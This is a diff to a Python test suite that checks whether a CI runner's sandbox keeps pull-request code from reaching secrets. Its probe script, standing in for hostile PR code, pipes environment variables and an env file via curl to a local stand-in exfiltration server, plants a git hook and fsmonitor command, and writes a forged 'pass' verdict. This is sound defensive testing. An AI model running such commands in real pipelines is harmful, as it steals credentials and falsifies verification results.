@@ -323,6 +323,8 @@ env | grep -E '^(GH_TOKEN|GITHUB_TOKEN|AWS_SECRET_ACCESS_KEY|DATABASE_URL|HOME)=
 cat '@HOME_CANARY@' '@TMP_CANARY@' '@VF_CANARY@' 2>&1
 cat '@RUNNER_HOME@/env/acme__app.env' "$MIRROR/config" 2>&1
 curl -s -m 3 'http://127.0.0.1:@PORT@/' 2>&1
+env | curl -s -m 3 --data-binary @- 'http://127.0.0.1:@EXFIL@/' >/dev/null 2>&1
+cat '@RUNNER_HOME@/env/acme__app.env' 2>/dev/null | curl -s -m 3 --data-binary @- 'http://127.0.0.1:@EXFIL@/' >/dev/null 2>&1
 printf '#!/bin/sh\\ntouch @MARKER@\\n' > "$MIRROR/hooks/reference-transaction" 2>&1 && chmod +x "$MIRROR/hooks/reference-transaction"
 git config core.fsmonitor 'touch @MARKER@' 2>&1
 mkdir -p .verify/runs && echo '{"verdict": "pass", "forged": true}' > ".verify/runs/$VERIFY_SHA.json"
@@ -340,6 +342,16 @@ class CanaryHandler(http.server.BaseHTTPRequestHandler):
 
     def log_message(self, *a):
         pass
+
+
+class ExfilHandler(CanaryHandler):
+    """Stands in for any server on the internet: records whatever a job sends it."""
+    received = []
+
+    def do_POST(self):
+        self.received.append(self.rfile.read(int(self.headers.get("Content-Length") or 0)).decode(errors="replace"))
+        self.send_response(200)
+        self.end_headers()
 
 
 def tree_digest(root):
@@ -371,19 +383,25 @@ class RunnerIsolation(unittest.TestCase):
         self.marker = self.tmp / "marker"
         self.srv = http.server.HTTPServer(("127.0.0.1", 0), CanaryHandler)
         threading.Thread(target=self.srv.serve_forever, daemon=True).start()
+        ExfilHandler.received = []
+        self.exfil = http.server.HTTPServer(("127.0.0.1", 0), ExfilHandler)
+        threading.Thread(target=self.exfil.serve_forever, daemon=True).start()
         os.environ.update(GH_TOKEN="canary-runner-gh-1", AWS_SECRET_ACCESS_KEY="canary-runner-aws-1")
-        (self.runner_home / "env/acme__app.env").write_text("DATABASE_URL=canary-envfile-db-1\nGH_TOKEN=canary-envfile-gh-1\n")
+        (self.runner_home / "env/acme__app.env").write_text("SECRET_API_KEY=canary-secret-1\nGH_TOKEN=canary-envfile-gh-1\n")
+        (self.runner_home / "env/acme__app.pr.env").write_text("DATABASE_URL=pr-visible-db-1\n")
         base_cfg = {"version": 1, "setup": "sh probe.sh setup", "stages": {
             "static": {"run": "sh probe.sh static"}, "unit": {"run": "git status >/dev/null 2>&1; sh probe.sh unit"},
             "integration": {"run": "sh probe.sh integration", "env": ["DATABASE_URL", "GH_TOKEN"]},
-            **{s: {"run": None, "na": "test"} for s in ("journeys", "evals", "rehearsal")}}}
-        origin = make_repo({"probe.sh": "echo benign\n"}, base_cfg)
+            "rehearsal": {"run": "sh probe.sh rehearsal", "env": ["SECRET_API_KEY"]},
+            **{s: {"run": None, "na": "test"} for s in ("journeys", "evals")}}}
+        origin = self.origin = make_repo({"probe.sh": "echo benign\n"}, base_cfg)
         self.mirror = self.tmp / "mirror.git"
         git(origin, "checkout", "-q", "-b", "pr")
         probe = PROBE
         for k, v in {"MIRROR": self.mirror, "HOME_CANARY": self.home_canary, "TMP_CANARY": self.tmp_canary,
                      "VF_CANARY": self.tmp / "vf-canary.txt", "RUNNER_HOME": self.runner_home,
-                     "PORT": self.srv.server_address[1], "MARKER": self.marker}.items():
+                     "PORT": self.srv.server_address[1], "EXFIL": self.exfil.server_address[1],
+                     "MARKER": self.marker}.items():
             probe = probe.replace(f"@{k}@", str(v))
         (origin / "probe.sh").write_text(probe)
         (origin / ".verify/config.json").write_text(json.dumps({"version": 1, "stages": {
@@ -397,14 +415,15 @@ class RunnerIsolation(unittest.TestCase):
         verify.RUNNER_HOME = self.saved[0]
         os.environ.clear()
         os.environ.update(self.saved[1])
-        self.srv.shutdown()
-        self.srv.server_close()
+        for s in (self.srv, self.exfil):
+            s.shutdown()
+            s.server_close()
         self.home_canary.unlink(missing_ok=True)
         self.tmp_canary.unlink(missing_ok=True)
         shutil.rmtree(self.tmp, ignore_errors=True)
 
     CANARIES = ("HOME-CANARY", "TMP-CANARY", "VF-CANARY", "PORT-CANARY", "canary-runner-gh-1", "canary-runner-aws-1",
-                "canary-envfile-gh-1", "canary-envfile-db-1", "mirror = true")
+                "canary-envfile-gh-1", "canary-secret-1", "mirror = true")
 
     def test_every_probe_works_without_the_sandbox(self):
         mirror_copy = self.tmp / "mirror-copy.git"
@@ -418,6 +437,7 @@ class RunnerIsolation(unittest.TestCase):
         rc, out = verify.sh(["/bin/sh", "-c", script, "probe", "control"], cwd=clone, env=env, timeout=60)
         for c in self.CANARIES:
             self.assertTrue(c in out, f"control could not reach {c}")
+        self.assertTrue("canary-secret-1" in "".join(ExfilHandler.received), "control could not send out a secret")
         self.assertTrue(self.marker.exists())
         self.marker.unlink()
         verify.git(clone, "status")  # what the planted fsmonitor does to anyone running git there afterwards
@@ -426,7 +446,8 @@ class RunnerIsolation(unittest.TestCase):
 
     def run_pr(self, fork):
         posts = []
-        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=None)
+        # The exfil port stands for open egress: the job may reach it, as it may reach the internet.
+        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
         before = tree_digest(self.mirror)
         rc, out = quiet(verify.run_job, "acme/app", self.mirror, self.sha, "main", "PR #1", args,
                         lambda c, s, d: posts.append((c, s, d)) or True, fork)
@@ -434,7 +455,9 @@ class RunnerIsolation(unittest.TestCase):
         self.assertEqual(rc, "done", out)
         self.assertEqual(tree_digest(self.mirror), before, "PR code changed the runner's mirror")
         self.assertFalse(self.marker.exists(), "PR code wrote outside its job, or the runner ran its git plant")
-        seen = out + art + json.dumps(posts)
+        sent = "".join(ExfilHandler.received)
+        self.assertTrue(sent, "the job never reached the exfil server, so the test proves nothing")
+        seen = out + art + json.dumps(posts) + sent
         for c in self.CANARIES:
             self.assertFalse(c in seen, f"{c} leaked")
         self.assertIn("PROBE-RAN-static", art)  # the base branch's config ran, not the PR's `run: "true"`
@@ -444,18 +467,37 @@ class RunnerIsolation(unittest.TestCase):
         self.assertIn("ran main's config, not this PR's edit", final[2])
         return json.loads(art), posts
 
-    def test_same_repo_pr_gets_the_env_file_masked_and_nothing_else(self):
+    def test_same_repo_pr_gets_no_secrets_and_cannot_send_one_out(self):
         art, _ = self.run_pr(fork=False)
+        self.assertTrue("pr-visible-db-1" in "".join(ExfilHandler.received), "PR-visible values should reach PR code")
         stages = {s["stage"]: s for s in art["stages"]}
         self.assertTrue(art["sandboxed"])
         self.assertEqual(stages["integration"]["status"], "fail")  # GH_TOKEN is required but never passed
         self.assertIn("missing required env: GH_TOKEN", stages["integration"]["detail"])
         self.assertIn("DATABASE_URL=***", stages["static"]["tail"])
+        # A stage that needs a secret is not verified on a PR (missing), rather than reported broken (fail).
+        self.assertEqual((stages["rehearsal"]["status"], "SECRET_API_KEY" in stages["rehearsal"]["detail"]), ("missing", True))
 
     def test_fork_pr_gets_no_env_file(self):
         art, _ = self.run_pr(fork=True)
         self.assertNotIn("DATABASE_URL=", json.dumps(art))
+        self.assertFalse("pr-visible-db-1" in "".join(ExfilHandler.received))
         self.assertIn("DATABASE_URL", {s["stage"]: s for s in art["stages"]}["integration"]["detail"])
+
+    def test_owner_branch_job_gets_the_secrets(self):
+        # Positive control for the split: merged code on an owner-chosen branch does get <slug>.env.
+        git(self.origin, "checkout", "-q", "-b", "trusted", "main")
+        (self.origin / "probe.sh").write_text(self.probe)
+        git(self.origin, "commit", "-qam", "probe on a trusted branch")
+        sha = subprocess.run(["git", "-C", str(self.origin), "rev-parse", "HEAD"], capture_output=True, text=True).stdout.strip()
+        mirror = self.tmp / "trusted.git"
+        subprocess.run(["git", "clone", "-q", "--mirror", str(self.origin), str(mirror)], check=True)
+        args = argparse.Namespace(unsandboxed=False, allow_read=None, allow_host_port=[self.exfil.server_address[1]])
+        rc, _ = quiet(verify.run_job, "acme/app", mirror, sha, None, "trusted", args, lambda c, s, d: True)
+        self.assertEqual(rc, "done")
+        self.assertTrue("SECRET_API_KEY=canary-secret-1" in "".join(ExfilHandler.received), "branch job lacked its secret")
+        art = json.loads((self.runner_home / "runs/acme__app" / f"{sha}.json").read_text())
+        self.assertEqual({s["stage"]: s["status"] for s in art["stages"]}["rehearsal"], "pass")
 
     def test_no_sandbox_means_no_pr_code_runs(self):
         posts = []
